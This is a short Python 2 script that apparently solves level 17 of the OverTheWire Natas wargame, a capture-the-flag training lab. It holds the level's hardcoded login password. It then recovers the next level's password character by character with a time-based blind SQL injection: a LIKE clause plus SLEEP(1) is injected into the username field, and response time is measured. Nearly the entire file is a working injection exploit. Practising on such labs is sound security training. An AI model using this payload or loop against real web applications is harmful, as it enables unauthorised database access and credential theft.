#!/usr/bin/env python

import requests
import re
import urllib
import base64
from string import *
from time import *

characters = lowercase + uppercase + digits
#print characters

username = 'natas17'
password = '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'

#headers = { "Referer" : "http://natas5.natas.labs.overthewire.org/"}

#cookies = { "loggedin" : "1"}

url = 'http://%s.natas.labs.overthewire.org/' %username

#response = requests.get(url, auth = (username, password))
session = requests.Session()
seen_password = list()

while ( len(seen_password) < 32):
	for character in characters:
		start_time = time()

		#print "start_time", start_time
		print "trying", "".join(seen_password) + character
		response = session.post(url, data = {"username" : 'natas18"  AND BINARY password LIKE "' + "".join(seen_password) + character + '%" AND SLEEP(1) #'}, auth = (username, password) )
		content = response.text
		end_time = time()
		difference = end_time - start_time
		#print "... end time", end_time, " and difference  ", difference
		

		if (difference > 1 ):
			#success, correct character!
			seen_password.append(character)
			break
		#rint content
		#print "this is not the first character", character
		#else:
			#print "THIS IS THE FIRST CHAR", character
